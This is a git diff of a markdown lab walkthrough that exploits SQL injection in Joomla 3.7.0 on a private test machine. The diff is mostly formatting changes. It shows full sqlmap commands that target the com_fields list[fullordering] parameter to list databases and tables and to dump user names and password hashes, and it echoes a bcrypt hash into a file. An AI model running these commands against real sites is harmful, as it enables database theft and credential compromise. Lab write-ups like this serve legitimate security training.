@@ -52,6 +52,13 @@ joomscan -u http://192.168.0.106/
 
 I Nothing found here so I searched for exploit for joomla 3.7.0 exploit in searchsploit
 
+
+### Exploiting 
+
+
+
+
+
 searchsploit joomla 3.7.0
 
 
@@ -59,10 +66,19 @@ searchsploit joomla 3.7.0
 
 I found a exploit with exact verison 3.7.0 then i copied the exploit to my path using command 
 
+
+
+
+
 searchsploit -m php/webapps/42033.txt
 
 
 ![Screenshot from 2023-01-20 17-48-31](https://user-images.githubusercontent.com/108471951/213868147-7a2aa1d5-ab05-4eef-9b96-ccdcea692a76.png)
+
+
+
+
+
 
 cat 42033.txt
 
@@ -71,6 +87,10 @@ cat 42033.txt
 
 here we can check the usage 
 
+
+
+
+
 As in the usage I have pasted the link which is in usage, after url
 
 ![Screenshot from 2023-01-20 17-51-20](https://user-images.githubusercontent.com/108471951/214651912-a329a7ab-bacf-42af-aec7-501a8e9bba0d.png)
@@ -78,9 +98,18 @@ As in the usage I have pasted the link which is in usage, after url
 By that we gor sql error ,then I confirmed this site is vulnerable to SQL SYNTAX ,after I run sqlmap tool
 
 
+
+
+
+
+
 sqlmap -u "http://192.168.0.106//index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent --dbs -p list[fullordering]
 
 ![Screenshot from 2023-01-20 17-53-37](https://user-images.githubusercontent.com/108471951/214653293-68418277-3efe-4029-b5f2-c6039c748f24.png)
+
+
+
+
 
 
 now i got availabe databases 
@@ -90,6 +119,10 @@ now i got availabe databases
 
 
 in this the zoomlabd is intersting for me 
+
+
+
+
 
  sqlmap -u "http://192.168.0.106//index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent -D joomladb --tables
 
@@ -102,14 +135,25 @@ now i got tables
 
 ![Screenshot from 2023-01-20 18-36-07](https://user-images.githubusercontent.com/108471951/214654277-56d102fb-8560-46ee-8ed5-0912b6d3dd32.png)
 
-in that i found users, so i dumped the users
+
+
+
+
+
+I found users, so i dumped the users
+
 
 sqlmap -u "http://192.168.0.106//index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent -D joomladb -T '#__users' -C name,password --dump
 
 ![Screenshot from 2023-01-20 18-41-22](https://user-images.githubusercontent.com/108471951/214654478-0d269bda-9533-4200-bc23-5957c25609af.png)
 
-here i found user name and passwd,but as we can see the passwd is in hash formate.
+I found user name and passwd,but as we can see the passwd is in hash formate.
 i created a file hash.txt with hash in it
+
+![Screenshot from 2023-01-20 18-41-38](https://user-images.githubusercontent.com/108471951/214669122-7c1111a0-5f4d-41f0-b64c-d86ed6624737.png)
+
+
+
 
  echo '$2y$10$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu' >hash.txt
  
